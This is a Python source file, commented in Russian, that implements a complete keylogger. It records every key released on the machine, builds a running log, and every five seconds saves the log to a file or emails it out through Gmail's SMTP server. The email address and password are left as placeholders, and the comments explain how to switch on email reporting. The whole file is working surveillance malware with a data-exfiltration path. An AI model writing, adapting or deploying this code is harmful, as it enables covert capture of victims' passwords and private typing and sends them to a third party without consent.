import keyboard
import smtplib # Для отправки электронной почты по протоколу SMTP (gmail)
from threading import Timer # Таймер для запуска через заданный интервал времени
from datetime import datetime

send_report_every = 5
email_address = '-//-//-//-'
email_password = '-//-//-//-'


class KeyLogger:
    def __init__(self, interval, report_method='email'):
        # В качестве метода отправки устанавливается 'email'
        # Передача send_report_every в интервал
        self.interval = interval
        self.report_method = report_method
        # Cтроковая переменная, которая содержит лог
        self.log = ""
        # Запись начала и окончания даты и времени
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == 'space':
                name = ' '
            elif name == 'enter':
                name = '[ENTER]\n'
            elif name == 'decimal':
                name = '.'
            else:
                # Замена пробелов символами нижнего подчеркивания
                name = name.replace(' ', '_')
                name = f"[{name.upper()}]"
        # Добавление имя ключа в глобальную переменную
        self.log += name

    # Метод записи в локальный файл
    def update_filename(self):
        # Создание имя файла, которое идентифицируется по дате начала и окончания записи
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        # Создание файла
        with open(f"{self.filename}.txt", "w") as f:
            # Запись лога
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def sendmail(self, email, password, message):
        # Управление подключением к SMTP-серверу
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # Подключение к SMTP-серверу в режиме TLS
        server.starttls()
        # Логин
        server.login(email, password)
        # Отправка сообщения
        server.sendmail(email, email, message)
        # Завершение сеанса
        server.quit()

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            # Обновление 'self.filename'
            self.update_filename()
            if self.report_method == 'email':
                self.sendmail(email_address, email_password, self.log)
            elif self.report_method == 'file':
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ''
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        # Запись даты и время начала
        self.start_dt = datetime.now()
        # Запуск кейлогера
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == '__main__':
    # для отправки по email раскомментировать строку ниже и закомментировать строку с report_method="file"
    # keylogger = KeyLogger(interval=send_report_every, report_method="email")
    # для записи в локальный файл оставляем как есть
    keylogger = KeyLogger(interval=send_report_every, report_method="file")
    keylogger.start()
